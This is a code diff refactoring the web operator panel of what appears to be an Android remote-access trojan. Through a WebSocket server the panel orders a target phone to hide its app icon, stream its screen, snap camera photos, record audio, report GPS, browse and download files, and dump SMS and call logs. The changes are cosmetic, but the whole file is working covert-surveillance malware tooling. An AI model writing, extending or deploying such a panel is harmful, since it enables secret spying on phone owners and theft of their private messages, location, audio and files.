@@ -78,13 +78,11 @@ button:hover{
     overflow:auto;
     padding:20px;
 }
-/* map container */
 #map{
     height:400px;
     width:100%;
     border-radius:8px;
 }
-/* table */
 table{
     width:100%;
     border-collapse:collapse;
@@ -101,7 +99,6 @@ th{
     background:#f7f9fc;
     text-align:left;
 }
-/* file list */
 .file{
     padding:10px;
     border-bottom:1px solid #eef1f6;
@@ -146,14 +143,14 @@ video,img{
 <button id="backCamToggle" onclick="toggleBackCam()">📷 Start Back Camera</button>
 <button id="micToggle" onclick="toggleMic()">🎤 Start Mic</button>
 
-<button onclick="sendCommand('getLocation')">📍 GPS</button>
+<button onclick="sendJSON('getLocation', {})">📍 GPS</button>
 <button id="iconToggle" onclick="toggleAppIcon()">👻 Hide Icon</button>
 
 <div class="section-title">Data</div>
 
-<button onclick="sendCommand('listFiles', { path: 'root' })">📂 File Manager</button>
-<button onclick="sendCommand('getSMS', { box: 'inbox' })">💬 SMS Logs</button>
-<button onclick="sendCommand('getCallLogs')">📞 Call Logs</button>
+<button onclick="sendJSON('listFiles', { path: 'root' })">📂 File Manager</button>
+<button onclick="sendJSON('getSMS', { box: 'inbox' })">💬 SMS Logs</button>
+<button onclick="sendJSON('getCallLogs', {})">📞 Call Logs</button>
 
 </div>
 
@@ -169,8 +166,10 @@ Ready.
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-const WS_URL = "wss://mirror-view.onrender.com";
+// ================== CONFIG ==================
+const WS_URL = "wss://mirror-view.onrender.com"; // Change if needed
 
+// ================== GLOBALS ==================
 let ws;
 let pc; // for screen sharing
 let currentData = [];
@@ -183,24 +182,34 @@ let screenActive = false;
 let frontCamActive = false;
 let backCamActive = false;
 let micActive = false;
-let iconHidden = false;
+let iconHidden = false; // actual state will be updated by responses
 
 const panel = document.getElementById("panel");
+const statusDiv = document.getElementById("status");
 
-/* ===== CONNECTION ===== */
+// ================== CONNECTION ==================
 function connect() {
     ws = new WebSocket(WS_URL);
     ws.onopen = () => {
+        console.log("WebSocket open");
         ws.send("I_AM_WEB");
         setStatus("ONLINE");
     };
     ws.onclose = () => {
+        console.log("WebSocket closed");
         setStatus("OFFLINE");
         setTimeout(connect, 4000);
     };
+    ws.onerror = (err) => {
+        console.error("WebSocket error", err);
+    };
     ws.onmessage = (e) => {
         const msg = e.data;
-        if (msg.startsWith("SMS_DATA:")) {
+        console.log("Received:", msg);
+
+        if (msg.startsWith("STATUS:")) {
+            setStatus(msg.substring(7));
+        } else if (msg.startsWith("SMS_DATA:")) {
             dataType = 'sms';
             currentData = JSON.parse(msg.substring(9));
             renderTable();
@@ -228,20 +237,29 @@ function connect() {
         } else if (msg.startsWith("APP_SHOWN")) {
             iconHidden = false;
             document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
+        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
+            // nothing needed
+        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
+            if (pc) { pc.close(); pc = null; }
+        } else if (msg.startsWith("AUDIO_RECORDING_STARTED")) {
+            micActive = true;
+            document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
+        } else if (msg.startsWith("AUDIO_RECORDING_STOPPED")) {
+            micActive = false;
+            document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
         }
     };
 }
 
 function setStatus(s) {
-    const el = document.getElementById("status");
-    el.innerText = s;
-    el.style.background = s === "ONLINE" ? "#e8f5e9" : "#ffebee";
+    statusDiv.innerText = s;
+    statusDiv.style.background = s === "ONLINE" ? "#e8f5e9" : "#ffebee";
 }
 
-/* ===== SEND COMMAND (JSON) ===== */
-function sendCommand(command, params = {}) {
-    if (!ws || ws.readyState !== 1) {
-        alert("Not connected");
+// ================== SEND JSON COMMAND ==================
+function sendJSON(command, params = {}) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+        alert("Not connected to server");
         return;
     }
     const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -253,21 +271,17 @@ function sendCommand(command, params = {}) {
         timestamp: Date.now()
     };
     ws.send(JSON.stringify(payload));
+    console.log("Sent:", payload);
 }
 
-// Legacy plain send (for backward compatibility, but we'll use sendCommand for new features)
-function send(cmd) {
-    if (ws && ws.readyState === 1) ws.send(cmd);
-}
-
-/* ===== TOGGLE BUTTONS ===== */
+// ================== TOGGLE BUTTONS ==================
 function toggleScreen() {
     if (screenActive) {
-        sendCommand('STOP_SCREEN_SHARE');
+        sendJSON('STOP_SCREEN_SHARE');
         document.getElementById("screenToggle").innerHTML = "🖥 Start Screen";
     } else {
         panel.innerHTML = "<h2>Waiting for screen...</h2>";
-        sendCommand('START_SCREEN_SHARE');
+        sendJSON('START_SCREEN_SHARE');
         document.getElementById("screenToggle").innerHTML = "⏹ Stop Screen";
     }
     screenActive = !screenActive;
@@ -275,14 +289,15 @@ function toggleScreen() {
 
 function toggleFrontCam() {
     if (frontCamActive) {
-        // Camera sends one image then stops, so we just revert button
+        // Camera sends one image then stops, so just revert button
         document.getElementById("frontCamToggle").innerHTML = "📷 Start Front Camera";
     } else {
-        sendCommand('cameraSnapshot', { camera: 'front' });
+        sendJSON('cameraSnapshot', { camera: 'front' });
         document.getElementById("frontCamToggle").innerHTML = "⏹ Stop Front Camera";
     }
     frontCamActive = !frontCamActive;
     if (frontCamActive) {
+        // Auto-revert after 5 seconds (camera stops after one shot)
         setTimeout(() => {
             if (frontCamActive) {
                 frontCamActive = false;
@@ -296,7 +311,7 @@ function toggleBackCam() {
     if (backCamActive) {
         document.getElementById("backCamToggle").innerHTML = "📷 Start Back Camera";
     } else {
-        sendCommand('cameraSnapshot', { camera: 'back' });
+        sendJSON('cameraSnapshot', { camera: 'back' });
         document.getElementById("backCamToggle").innerHTML = "⏹ Stop Back Camera";
     }
     backCamActive = !backCamActive;
@@ -312,27 +327,26 @@ function toggleBackCam() {
 
 function toggleMic() {
     if (micActive) {
-        sendCommand('STOP_AUDIO_RECORDING');
-        document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
+        sendJSON('STOP_AUDIO_RECORDING');
+        // Button text will be updated by the response
     } else {
-        sendCommand('START_AUDIO_RECORDING');
-        document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
+        sendJSON('START_AUDIO_RECORDING');
+        // Button text will be updated by the response
     }
-    micActive = !micActive;
+    // We don't toggle immediately; wait for response
 }
 
 function toggleAppIcon() {
     if (iconHidden) {
-        sendCommand('showApp');
-        document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
+        sendJSON('showApp');
+        // Button text updates on response
     } else {
-        sendCommand('hideApp');
-        document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
+        sendJSON('hideApp');
+        // Button text updates on response
     }
-    iconHidden = !iconHidden;
 }
 
-/* ===== PANEL RENDERERS ===== */
+// ================== PANEL RENDERERS ==================
 function showImage(base64) {
     panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
     frontCamActive = false;
@@ -356,7 +370,6 @@ function renderTable() {
     }
 
     let filteredData;
-    let columnStyles = "";
     if (dataType === 'sms') {
         filteredData = currentData.map(item => ({
             Type: item.type,
@@ -364,7 +377,6 @@ function renderTable() {
             Message: item.body,
             Date: item.date
         }));
-        columnStyles = "sms-table";
     } else if (dataType === 'call') {
         filteredData = currentData.map(item => ({
             Type: item.type,
@@ -373,9 +385,8 @@ function renderTable() {
             Date: item.date,
             Duration: item.durationFormatted || item.duration + 's'
         }));
-        columnStyles = "call-table";
     } else {
-        filteredData = currentData;
+        filteredData = currentData; // fallback
     }
 
     const start = currentPage * 20;
@@ -385,7 +396,7 @@ function renderTable() {
         return;
     }
 
-    let html = `<table class="${columnStyles}"><tr>`;
+    let html = `<table><tr>`;
     Object.keys(rows[0]).forEach(k => {
         html += `<th>${k}</th>`;
     });
@@ -424,15 +435,24 @@ function renderFiles() {
     }
     let html = "<h3>File Explorer</h3>";
     currentData.forEach(f => {
-        html += `
-        <div class="file" onclick="sendCommand('${f.isDir ? 'listFiles' : 'downloadFile'}', { path: '${f.path}' })">
-            ${f.isDir ? '📁' : '📄'} ${f.name}
-        </div>`;
+        // Use a data attribute to store path and call a function with proper escaping
+        html += `<div class="file" data-path="${f.path}" data-isdir="${f.isDir}" onclick="handleFileClick(this)">${f.isDir ? '📁' : '📄'} ${f.name}</div>`;
     });
     panel.innerHTML = html;
 }
 
-/* ===== WEBRTC ===== */
+// Helper for file clicks
+window.handleFileClick = function(element) {
+    const path = element.dataset.path;
+    const isDir = element.dataset.isdir === 'true';
+    if (isDir) {
+        sendJSON('listFiles', { path: path });
+    } else {
+        sendJSON('downloadFile', { path: path });
+    }
+};
+
+// ================== WEBRTC ==================
 function handleOffer(sdp) {
     if (!pc) {
         pc = new RTCPeerConnection({
@@ -444,7 +464,7 @@ function handleOffer(sdp) {
         };
         pc.onicecandidate = (e) => {
             if (e.candidate) {
-                sendCommand('iceCandidate', {
+                sendJSON('iceCandidate', {
                     candidate: e.candidate.candidate,
                     sdpMid: e.candidate.sdpMid,
                     sdpMLineIndex: e.candidate.sdpMLineIndex
@@ -456,11 +476,12 @@ function handleOffer(sdp) {
         .then(() => pc.createAnswer())
         .then(a => pc.setLocalDescription(a))
         .then(() => {
-            sendCommand('answer', { sdp: pc.localDescription.sdp });
-        });
+            sendJSON('answer', { sdp: pc.localDescription.sdp });
+        })
+        .catch(e => console.error("WebRTC error", e));
 }
 
-// Initialize
+// ================== START ==================
 connect();
 </script>
 </body>
